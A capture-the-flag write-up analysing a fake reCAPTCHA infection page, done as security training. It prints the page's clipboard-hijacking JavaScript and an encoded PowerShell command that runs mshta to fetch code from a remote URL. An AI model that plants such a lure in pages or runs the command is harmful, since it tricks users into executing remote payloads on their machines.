
# What the challenge is about?

We're tracking a cyber actor's new malware campaign that's using a fake reCAPTCHA check to infect computers. Thankfully, the malware itself seems to have been taken down, but can you analyze the initial infection page to look for any signatures?


## Write-up

1) First I visited their page.
2) Then opened up inspect element.
3) Analyzed the javascript code.
4) Found the suspicious code
	
```JavaScript
function verify() { 
	const textToCopy = "powershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwBuAG8AbgBtAGEAbABpAGMAaQBvAHUAcwBjAGEAcAB0AGMAaABhAC4AbQBlAHQAYQBwAHIAbwBiAGwAZQBtAHMALgBjAG8AbQAvAE0AZQB0AGEAQwBUAEYAewBGADQAawAzAF8AYwA0AHAAVABjAGgAQABzAF8AcgB1AE4AXwBtADQAbAB3ADQAcgAzAH0A"; 
	
	const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.appendChild(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); 
	const recaptchaPopup = document.getElementById("recaptchaPopup"); const overlay = document.getElementById("overlay"); recaptchaPopup.classList.add("active"); overlay.classList.add("active"); } const verifyButton = document.getElementById('verifyButton'); verifyButton.addEventListener('click', verify);
```

5) Found the malicious powershell code : 
```JavaScript
powershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwBuAG8AbgBtAGEAbABpAGMAaQBvAHUAcwBjAGEAcAB0AGMAaABhAC4AbQBlAHQAYQBwAHIAbwBiAGwAZQBtAHMALgBjAG8AbQAvAE0AZQB0AGEAQwBUAEYAewBGADQAawAzAF8AYwA0AHAAVABjAGgAQABzAF8AcgB1AE4AXwBtADQAbAB3ADQAcgAzAH0A
```


6) Decoded the base64 code using the CyberChef website.
7) And Got the flag.

### Challenges I faced

1) I was not confident about whether the code was base64 or not.
2) Found the shortcoming or limitation of my base64-decoder I coded in python.

## What i will do next?

1) I will modify and update the base64 decoder so that it can decode into beyond utf texts, the output of this challenge seems to be a link to a website in the format **http://**

